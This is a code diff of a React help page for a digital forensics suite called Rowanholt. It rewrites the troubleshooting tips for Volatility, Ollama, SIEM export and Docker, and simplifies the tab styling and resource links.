-          <pre className="code-block">
-{`# Check memory dump
-file /path/to/memory.dmp
+              <div className="hp-issue">
+                <h4>A tool isn't found</h4>
+                <p>
+                  The worker image has every tool Elrond calls. Run Elrond there (the web app does), or see{' '}
+                  <ExternalLink href={doc('CONFIG.md')}>CONFIG.md</ExternalLink> to install them on a host. For
+                  Volatility 3 directly:
+                </p>
+                <Code>{`docker exec rowanholt-celery-worker \\
+  vol.py -f /path/to/memory.raw windows.info`}</Code>
+              </div>
 
-# Try different profile
-elrond -C -c CASE-001 -m /memory.dmp -p Win10x64_19041
-
-# Use Volatility directly
-vol3 -f /memory.dmp windows.info`}
-          </pre>
-
-          <h4>AI Agent Issues</h4>
-          <pre className="code-block">
-{`# Check Ollama is running
-curl http://localhost:11434/api/tags
-
-# Restart Ollama
+              <div className="hp-issue">
+                <h4>Aulë can't reach the model</h4>
+                <p>
+                  Ask Aulë says which: Ollama isn't running, or the model isn't pulled. The backend looks for Ollama
+                  at <code>OLLAMA_HOST</code>, by default on the Docker host.
+                </p>
+                <Code>{`ollama list
 ollama serve
+ollama pull qwen3:8b`}</Code>
+              </div>
 
-# Check vector database
-rowanholt-ai info CASE-001
+              <div className="hp-issue">
+                <h4>SIEM export fails</h4>
+                <p>
+                  Elrond checks every SIEM before it processes anything and stops if one is unreachable. Start them
+                  (they're left out by <code>--testing</code>), then send a finished case again without reprocessing.
+                </p>
+                <Code>{`rowanholt start
+python3 src/analysis/elrond.py CASE-001 /cases/CASE-001 \\
+  --Index --Splunk --Elastic`}</Code>
+              </div>
 
-# Re-index if needed
-rowanholt-ai reindex CASE-001`}
-          </pre>
+              <div className="hp-issue">
+                <h4>"unrecognized arguments" from a module</h4>
+                <p>
+                  You ran a <code>python3 -m src.analysis…</code> module from inside <code>src/analysis</code>. Run it
+                  from the repository root.
+                </p>
+              </div>
+            </div>
+          </section>
 
-          <h4>SIEM Export Failures</h4>
-          <pre className="code-block">
-{`# Test Splunk connection
-curl -k https://splunk:8088/services/collector/health
-
-# Verify HEC token
-python3 -m rowanholt.siem.splunk_test --hec-token YOUR_TOKEN
-
-# Check firewall rules
-telnet splunk 8088`}
-          </pre>
-
-          <h4>Docker Issues</h4>
-          <pre className="code-block">
-{`# Check container status
-docker-compose ps
-
-# View logs
-docker-compose logs rowanholt
-
-# Rebuild containers
-docker-compose build --no-cache
-docker-compose up -d`}
-          </pre>
-
-          <h4>Debug Mode</h4>
-          <pre className="code-block">
-{`# Maximum verbosity
-elrond -C -c CASE-001 -s /evidence --veryverbose
-
-# Enable debug logs
-export ROWANHOLT_DEBUG=1
-python3 -m rowanholt.analysis.engine`}
-          </pre>
-
-          <h4>Getting Help</h4>
-          <ul>
-            <li>
-              <strong>GitHub Issues:</strong>{' '}
-              <a
-                href="https://github.com/cmdaltr/rowanholt/issues"
-                target="_blank"
-                rel="noopener noreferrer"
-                style={{ color: '#a7db6c' }}
-              >
-                Report bugs and request features
-              </a>
-            </li>
-            <li>
-              <strong>GitHub:</strong>{' '}
-              <a
-                href="https://github.com/cmdaltr"
-                target="_blank"
-                rel="noopener noreferrer"
-                style={{ color: '#a7db6c' }}
-              >
-                @cmdaltr
-              </a>
-            </li>
-            <li><strong>Documentation:</strong> Check /docs directory for detailed guides</li>
-          </ul>
+          <section>
+            <h4>Getting help</h4>
+            <ul className="hp-cols">
+              <li><ExternalLink href={`${REPO}/issues`}>GitHub issues</ExternalLink>: bugs and requests</li>
+              <li><ExternalLink href={doc('CLI.md#troubleshooting')}>CLI.md</ExternalLink>: more of the above</li>
+              <li>Each case's <code>rowanholt_audit.log</code>: what Elrond did, and when</li>
+            </ul>
+          </section>
         </>
-      )
-    }
+      ),
+    },
   };
 
   return (
-    <div className="journey-detail">
+    <div className="journey-detail help-page">
       <section className="hero-section">
         <img
           src={heroImage}
           alt="Rowanholt"
           className="hero-image"
-          style={{
-            transform: 'scale(0.2)',
-            transformOrigin: 'center top'
-          }}
+          style={{ transform: 'scale(0.2)', transformOrigin: 'center top' }}
         />
       </section>
 
       <header>
-        <h2>Help & Documentation</h2>
-        <p>
-          Comprehensive guide to using the Rowanholt DF Acceleration Suite.
-        </p>
+        <h2>About Rowanholt</h2>
+        <p>How the parts fit together, the commands behind the web app, and what to check when something breaks.</p>
       </header>
 
       <div data-guide="about.docs" className="card">
-        {/* Tab Navigation */}
-        <div style={{
-          display: 'flex',
-          borderBottom: '2px solid #3f4b2a',
-          marginBottom: '1.5rem',
-          overflow: 'hidden',
-          width: '100%'
-        }}>
-          {Object.keys(sections).map((key, index) => (
+        <div className="hp-tabs" role="tablist">
+          {Object.keys(sections).map((key) => (
             <button
               key={key}
+              role="tab"
+              aria-selected={activeSection === key}
+              className={`hp-tab${activeSection === key ? ' is-active' : ''}`}
               onClick={() => setActiveSection(key)}
-              style={{
-                flex: '1 1 auto',
-                padding: '0.75rem 0.5rem',
-                background: activeSection === key ? 'rgba(167, 219, 108, 0.15)' : 'transparent',
-                color: activeSection === key ? '#a7db6c' : '#888',
-                border: 'none',
-                borderBottom: activeSection === key ? '2px solid #a7db6c' : '2px solid transparent',
-                marginBottom: '-2px',
-                cursor: 'pointer',
-                fontFamily: 'Cinzel, Times New Roman, serif',
-                fontSize: '0.85rem',
-                fontWeight: activeSection === key ? '600' : '400',
-                transition: 'all 0.2s ease',
-                whiteSpace: 'nowrap',
-                textAlign: 'center'
-              }}
-              onMouseOver={(e) => {
-                if (activeSection !== key) {
-                  e.target.style.color = '#a7db6c';
-                  e.target.style.background = 'rgba(167, 219, 108, 0.05)';
-                }
-              }}
-              onMouseOut={(e) => {
-                if (activeSection !== key) {
-                  e.target.style.color = '#888';
-                  e.target.style.background = 'transparent';
-                }
-              }}
             >
               {sections[key].title}
             </button>
           ))}
         </div>
 
-        <div className="help-content">
+        <div className="help-content" role="tabpanel">
           {sections[activeSection].content}
         </div>
 
-        <div style={{ marginTop: '3rem', padding: '1.5rem', background: 'rgba(167, 219, 108, 0.1)', borderRadius: '8px' }}>
+        <div className="hp-resources">
           <h4>Additional Resources</h4>
-          <ul>
-            <li>
-              <strong>Project Repository:</strong>{' '}
-              <a
-                href="https://github.com/cmdaltr/rowanholt"
-                target="_blank"
-                rel="noopener noreferrer"
-                style={{ color: '#a7db6c' }}
-              >
-                https://github.com/cmdaltr/rowanholt
-              </a>
-            </li>
-            <li>
-              <strong>Author:</strong>{' '}
-              <a
-                href="https://github.com/cmdaltr"
-                target="_blank"
-                rel="noopener noreferrer"
-                style={{ color: '#a7db6c' }}
-              >
-                @cmdaltr
-              </a>
-            </li>
-            <li><strong>Version:</strong> 2.1.0</li>
-            <li><strong>License:</strong> MIT</li>
+          <ul className="hp-cols">
+            <li><strong>Repository:</strong> <ExternalLink href={REPO}>github.com/cmdaltr/rowanholt</ExternalLink></li>
+            <li><strong>Author:</strong> <ExternalLink href="https://github.com/cmdaltr">@cmdaltr</ExternalLink></li>
+            <li><strong>Version:</strong> {VERSION}</li>
+            <li><strong>Licence:</strong> MIT</li>
           </ul>
         </div>
       </div>
